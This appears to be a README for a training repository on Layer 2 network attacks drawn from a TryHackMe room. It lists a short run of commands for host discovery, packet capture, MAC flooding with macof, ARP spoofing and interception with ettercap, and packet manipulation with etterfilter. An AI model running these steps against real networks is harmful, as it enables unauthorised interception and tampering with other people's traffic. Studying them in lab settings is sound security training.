# Layer2-Network-Attacks   

## Overview  
This repository explores Layer 2 network attacks, including **MAC flooding**, **ARP spoofing**, and **Man-in-the-Middle (MITM) attacks**. It covers methodologies, tools used, and mitigation techniques based on practical exercises from the **TryHackMe Layer2** room.  
 
## Attacks Covered  
- **Network Discovery** – Identifying active hosts and their details.   
- **Passive Network Sniffing** – Capturing and analyzing network traffic.  
- **MAC Flooding** – Overloading a switch to force traffic broadcast.   
- **ARP Spoofing** – Redirecting traffic by poisoning ARP tables.  
- **MITM Sniffing** – Intercepting and analyzing communications.  
- **MITM Manipulation** – Modifying network packets in transit.  

## Tools Used   
- `Nmap` – Network scanning and host discovery  
- `Tcpdump` – Packet capture and traffic analysis  
- `Macof` – MAC flooding attack tool  
- `Ettercap` – ARP spoofing and MITM attack tool  
- `Etterfilter` – Packet filtering and manipulation tool  

## Execution Steps  

```bash
# 1. Network Discovery  
sudo ip address show dev eth1  # Check interface details  
nmap -sn <target IP range>  # Discover active hosts  

# 2. Passive Network Sniffing  
tcpdump -A -i eth1 -w /tmp/tcpdump.pcap  
wireshark /tmp/tcpdump.pcap  # Open and analyze packet capture  

# 3. MAC Flooding Attack  
macof -i eth1  # Flood switch with fake MAC addresses  

# 4. ARP Spoofing with Ettercap  
ettercap -T -i eth1 -M arp  # Execute ARP spoofing attack  

# 5. MITM Sniffing  
nmap -n <IP range>  # Discover hosts  
ettercap -T -i eth1 -M arp  # Intercept and capture network traffic  

# 6. MITM Manipulation with Etterfilter  
etterfilter <filter_file> -o <compiled_filter_file>  
ettercap -T -q -F <compiled_filter_file> -i eth1  
